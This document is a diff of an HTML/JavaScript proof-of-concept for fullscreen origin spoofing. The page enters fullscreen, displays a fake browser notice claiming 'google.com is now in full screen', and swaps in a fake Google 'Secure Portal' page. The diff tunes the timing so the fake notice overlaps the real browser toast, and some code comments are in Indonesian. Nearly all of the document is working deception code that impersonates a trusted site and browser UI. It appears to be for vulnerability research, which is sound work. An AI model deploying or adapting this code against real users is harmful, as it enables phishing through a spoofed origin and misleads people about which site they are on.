@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PoC: Fullscreen Origin UI Redressing</title>
+<title>PoC: Fullscreen Origin Spoofing</title>
 <style>
   body {
     margin: 0;
@@ -57,32 +57,32 @@
     background: #1557b0;
   }
 
-  /* Fake Browser Fullscreen Notification — Text Only */
-  #fake-fullscreen-toast {
+  /* Fake Browser Notification - Muncul SEGERA */
+  #fake-notification {
     position: fixed;
     top: 20px;
     left: 50%;
     transform: translateX(-50%);
-    background: rgba(32, 33, 36, 0.95);
+    background: rgba(32, 33, 36, 0.98);
     color: #e8eaed;
     padding: 12px 24px;
     border-radius: 8px;
     font-family: 'Roboto', 'Segoe UI', system-ui, sans-serif;
     font-size: 14px;
     font-weight: 500;
-    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+    box-shadow: 0 4px 12px rgba(0,0,0,0.4);
     opacity: 0;
     pointer-events: none;
-    transition: opacity 0.5s ease-in-out;
     z-index: 999999;
     white-space: nowrap;
+    transition: opacity 0.3s ease;
   }
 
-  #fake-fullscreen-toast.visible {
+  #fake-notification.show {
     opacity: 1;
   }
 
-  /* Fake Content View */
+  /* Fake Content */
   .fake-content {
     display: none;
     flex-direction: column;
@@ -99,32 +99,33 @@
 </head>
 <body>
 
-  <!-- Initial View -->
   <div class="container" id="initial-view">
     <div class="title">
-      PoC: Fullscreen Origin UI Redressing via <code>blob:null</code> + Fullwidth Solidus
+      PoC: Fullscreen Origin Spoofing
     </div>
-    <button class="trigger-btn" onclick="initiateAttackSequence()">
+    <button class="trigger-btn" onclick="startFullscreenAttack()">
       Enter Fullscreen
     </button>
   </div>
 
-  <!-- Fake Content View (Shown after fullscreen) -->
   <div class="fake-content" id="fake-view">
     <h1 style="color: #4285f4; font-size: 3rem; margin-bottom: 10px;">
       G<span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span>
     </h1>
-    <p style="color: #5f6368;">Secure System Update Portal</p>
+    <p style="color: #5f6368;">Secure Portal</p>
   </div>
 
-  <!-- Fake Browser Toast Notification (Text Only) -->
-  <div id="fake-fullscreen-toast">
+  <!-- Fake Notification -->
+  <div id="fake-notification">
     google.com is now in full screen. Press Esc to exit.
   </div>
 
   <script>
-    function initiateAttackSequence() {
-      // 1. Request Real Fullscreen (Triggers real browser toast)
+    function startFullscreenAttack() {
+      // 1. Tampilkan fake notification SEGERA sebelum fullscreen
+      document.getElementById('fake-notification').classList.add('show');
+      
+      // 2. Request fullscreen
       const elem = document.documentElement;
       if (elem.requestFullscreen) {
         elem.requestFullscreen();
@@ -132,25 +133,22 @@
         elem.webkitRequestFullscreen();
       }
 
-      // 2. UI Redressing Sequence
+      // 3. Ganti konten segera
       setTimeout(() => {
-        // Hide initial view, show fake legitimate content
         document.getElementById('initial-view').style.display = 'none';
         document.getElementById('fake-view').classList.add('active');
+      }, 100);
 
-        // Real browser toast fades out around 2.5-3 seconds.
-        // Fade IN our fake toast right after for seamless illusion.
-        setTimeout(() => {
-          document.getElementById('fake-fullscreen-toast').classList.add('visible');
-        }, 2500);
-
-      }, 500);
+      // 4. Hilangkan fake notification setelah 3 detik (saat notifikasi asli hilang)
+      setTimeout(() => {
+        document.getElementById('fake-notification').classList.remove('show');
+      }, 3000);
     }
 
-    // Exit fullscreen handler — clean up fake toast
+    // Reset saat exit fullscreen
     document.addEventListener('fullscreenchange', () => {
       if (!document.fullscreenElement) {
-        document.getElementById('fake-fullscreen-toast').classList.remove('visible');
+        document.getElementById('fake-notification').classList.remove('show');
         document.getElementById('fake-view').classList.remove('active');
         document.getElementById('initial-view').style.display = 'flex';
       }
